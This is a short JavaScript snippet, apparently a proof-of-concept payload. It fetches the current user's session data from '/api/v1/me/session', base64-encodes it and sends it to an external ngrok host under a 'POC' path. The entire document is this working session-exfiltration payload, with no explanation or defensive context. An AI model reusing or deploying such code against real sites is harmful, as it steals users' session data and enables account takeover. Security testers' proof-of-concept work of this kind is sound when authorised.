var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/v1/me/session', true);

xhr.onload = function () {
    if (xhr.status === 200) {
        // UTF-8 safe base64
        const base64 = btoa(unescape(encodeURIComponent(xhr.responseText)));

        fetch(
            'https://9909b2d4c6c9.ngrok-free.app/POC/?x=' +
            encodeURIComponent(base64)
        );
    }
};

xhr.onerror = function () {
    console.error('XHR request failed');
};

xhr.send();
